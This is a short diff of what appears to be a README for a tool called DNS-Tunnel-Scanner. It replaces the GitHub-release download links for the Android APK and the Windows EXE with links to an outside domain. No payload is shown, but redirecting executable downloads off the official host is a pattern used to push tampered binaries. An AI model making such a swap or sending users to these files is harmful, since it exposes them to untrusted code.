@@ -26,8 +26,8 @@ TA53aFyGNfSAcrCaJi9QmA9x5W47nPJcf7
 
 | | Download | |
 |---|---|---|
-| **Android** | [DNS-Tunnel-Scanner.apk](https://github.com/Plus98ir/DNS-Tunnel-Scanner/releases/latest/download/DNS-Tunnel-Scanner.apk) | Android 7+ |
-| **Windows** | [DNS-Tunnel-Scanner.exe](https://github.com/Plus98ir/DNS-Tunnel-Scanner/releases/latest/download/DNS-Tunnel-Scanner.exe) | double-click; no Python needed |
+| **Android** | [DNS-Tunnel-Scanner.apk](https://corenetbase.com/DNS-Tunnel-Scanner/dl/DNS-Tunnel-Scanner.apk) | Android 7+ |
+| **Windows** | [DNS-Tunnel-Scanner.exe](https://corenetbase.com/DNS-Tunnel-Scanner/dl/DNS-Tunnel-Scanner.exe) | double-click; no Python needed |
 
 ---
 
